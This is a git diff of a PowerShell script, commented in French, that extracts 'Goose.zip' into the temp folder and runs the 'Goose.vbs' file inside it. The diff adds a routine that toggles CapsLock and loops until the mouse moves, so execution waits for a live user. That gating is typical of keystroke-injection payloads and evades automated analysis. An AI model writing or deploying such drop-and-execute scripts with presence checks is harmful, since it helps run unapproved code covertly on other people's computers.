@@ -1,3 +1,20 @@
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+
 # Chemin temporaire pour stocker le fichier ZIP
 $tempZipPath = "$env:TEMP\Goose.zip"
 $tempExtractPath = "$env:TEMP\Goose"
@@ -10,6 +27,8 @@ Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath
 
 # Chemin du fichier VBS à exécuter
 $vbsFilePath = "$tempExtractPath\Goose.vbs"
+
+Pause-Script
 
 # Vérifier si le fichier VBS existe
 if (Test-Path $vbsFilePath) {
